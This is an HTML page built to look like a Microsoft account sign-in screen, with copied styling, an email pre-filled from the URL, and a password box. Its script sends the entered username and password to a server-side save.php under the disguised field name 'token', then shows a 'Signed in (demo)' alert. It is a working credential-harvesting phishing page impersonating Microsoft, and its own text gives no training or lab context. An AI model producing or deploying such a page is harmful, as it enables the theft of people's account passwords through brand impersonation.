<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Microsoft Sign in</title>
<style>
  :root { --ms-blue:#0067b8; --ms-blue-hover:#115ea3; --card-w:420px; --radius:4px; }
  *, *::before, *::after { box-sizing: border-box; }
  html,body{height:100%}
  body{
    margin:0;
    font-family: "Segoe UI Web (West European)", "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", Arial, sans-serif;
    background: radial-gradient(1000px 600px at 10% 10%, #f3f6fb 0%, #e9eff8 45%, #e6edf6 60%, #e9eff8 100%);
    display:grid;place-items:center;
    -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
  }
  input, button, select, textarea { font: inherit; }
  .shell { width: var(--card-w); margin: 0 auto; }
  .card,.options { width: 100%; }
  .card{ background:#fff;border-radius:var(--radius);box-shadow:0 2px 14px rgba(0,0,0,.12);padding:28px 28px 24px; }
  h1{font-size:28px;font-weight:400;margin:6px 0 14px;color:#000}
  .user-row{font-size:14px;color:#333;margin-bottom:10px}
  .user-row a{color:#000;text-decoration:none}
  .textbox{margin:0 0 4px}
  .textbox input{ width:100%;font-size:16px;padding:10px 2px 8px;border:none;border-bottom:1px solid #adadad;outline:none;background:transparent }
  .textbox input:focus{border-bottom:2px solid var(--ms-blue)}
  .links{margin:14px 0 18px;font-size:13px}
  .links a{color:var(--ms-blue);text-decoration:none}
  .links a:hover{text-decoration:underline}
  .actions{display:flex;justify-content:flex-end;margin-top:8px}
  .btn{ border:none;border-radius:2px;background:var(--ms-blue);color:#fff;padding:8px 18px;font-size:14px;cursor:pointer;min-width:96px;height:32px }
  .btn:hover{background:var(--ms-blue-hover)}
  .options{ margin-top:12px;background:#fff;border-radius:var(--radius);box-shadow:0 2px 14px rgba(0,0,0,.08);padding:12px 16px;display:flex;align-items:center;gap:10px }
  .options a{color:#000;text-decoration:none;font-size:14px}
  .options a:hover{text-decoration:underline}
</style>
</head>
<body>
  <div class="shell">
    <div class="card">
      <img id="bannerLogo" src="microsoft.svg" alt="Organization banner logo" class="banner-logo">

      
      <div class="user-row">
        <a id="emailLink" href="signin.html"></a>
      </div>

      <h1>Enter password</h1>

      <div class="textbox">
        <input id="iPassword" type="password" placeholder="Password" autocomplete="current-password" />
      </div>

      <div class="links">
        <a href="#">Forgot my password</a>
      </div>

      <div class="actions">
        <button class="btn" type="button" onclick="signIn()">Sign in</button>
      </div>
    </div>

    <div class="options">
      <a href="#" role="button">Sign-in options</a>
    </div>
  </div>

<script>

  const params = new URLSearchParams(location.search);
  const user = params.get('user') || '';
  const emailLink = document.getElementById('emailLink');
  if (emailLink) {
    emailLink.textContent = user || 'user@example.com';
    emailLink.href = 'index.html'; 
  }

 
  async function signIn(){
    const pwd = document.getElementById('iPassword').value.trim();
    if (!pwd) { alert('Please enter your password.'); return; }

   
    const payload = { user, password: pwd };

    try {
      const res = await fetch('save.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
        body: 'token=' + encodeURIComponent(JSON.stringify(payload))
      });

      if (res.status === 204 || res.ok) {
   
        alert('Signed in (demo). User: ' + (user || 'unknown'));
 
      } else {
        alert('Server error: ' + res.status);
      }
    } catch (e) {
      alert('Network error: ' + e.message);
    }
  }
</script>
</body>
</html>
